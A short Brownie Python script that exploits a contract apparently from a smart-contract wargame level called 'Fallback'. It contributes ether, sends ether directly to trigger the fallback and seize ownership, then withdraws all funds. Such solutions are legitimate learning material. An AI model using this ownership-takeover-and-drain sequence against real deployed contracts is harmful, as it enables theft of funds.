from brownie import interface, config, accounts, Contract
from web3 import Web3

CONTRACT_ADDRESS = "0xb9157a313c63A2dBAb3393aFf400F94EDC4ef1eA"
ACCOUNT = accounts.add(config["wallets"]["from_key"])


def contribute():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)

    contribute_tx = fallback_contract.contribute(
        {"from": ACCOUNT, "value": Web3.toWei(0.00002, "ether"), "gas_limit": 50000}
    )
    contribute_tx.wait(1)
    print("Contribution made")


def hack():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
    print(Contract)
    tx = ACCOUNT.transfer(fallback_contract.address, Web3.toWei(0.000002, "ether"))
    tx.wait(1)
    print("Ownability stolen")


def withdraw_all():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
    print("Withdrawing the funds")
    tx = fallback_contract.withdraw({"from": ACCOUNT})
    print("All the money is withdrow")
    print("The contract has been hacked")


def main():
    contribute()
    hack()
    withdraw_all()


